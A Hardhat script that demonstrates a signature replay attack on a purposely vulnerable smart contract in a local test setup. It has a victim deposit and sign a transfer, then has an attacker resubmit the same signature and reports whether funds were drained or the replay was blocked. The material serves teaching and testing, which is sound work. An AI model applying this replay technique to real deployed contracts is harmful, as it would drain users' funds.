const hre = require("hardhat");

/**
 * This script simulates a replay attack to demonstrate the vulnerability
 * Run AFTER deploying contracts
 */
async function main() {
  const [attacker, victim, recipient] = await hre.ethers.getSigners();
  
  const vulnerableAddress = process.env.VULNERABLE_ADDRESS;
  const VulnerableTransfer = await hre.ethers.getContractFactory("VulnerableTransfer");
  const vulnerable = VulnerableTransfer.attach(vulnerableAddress);

  console.log("\n=== REPLAY ATTACK SIMULATION ===\n");

  // Step 1: Victim deposits funds
  console.log("Step 1: Victim deposits 1 ETH...");
  await vulnerable.connect(victim).deposit({ value: hre.ethers.parseEther("1.0") });
  console.log("Victim balance:", hre.ethers.formatEther(await vulnerable.getBalance(victim.address)), "ETH");

  // Step 2: Victim signs a legitimate transaction
  console.log("\nStep 2: Victim signs a transfer of 0.1 ETH to recipient...");
  const amount = hre.ethers.parseEther("0.1");
  const messageHash = hre.ethers.solidityPackedKeccak256(
    ["address", "address", "uint256"],
    [victim.address, recipient.address, amount]
  );
  const signature = await victim.signMessage(hre.ethers.getBytes(messageHash));
  console.log("Signature captured:", signature.substring(0, 20) + "...");

  // Step 3: Legitimate transaction
  console.log("\nStep 3: Legitimate transaction executed...");
  await vulnerable.connect(victim).transfer(recipient.address, amount, signature);
  console.log("After legitimate tx - Victim balance:", hre.ethers.formatEther(await vulnerable.getBalance(victim.address)), "ETH");

  // Step 4: REPLAY ATTACK — reuse the same signature
  console.log("\nStep 4: REPLAY ATTACK — attacker replays the same transaction...");
  try {
    await vulnerable.connect(attacker).transfer(recipient.address, amount, signature);
    console.log("❌ ATTACK SUCCEEDED! Victim balance drained to:", 
      hre.ethers.formatEther(await vulnerable.getBalance(victim.address)), "ETH");
  } catch (e) {
    console.log("✅ Attack blocked:", e.message);
  }
}

main().catch(console.error);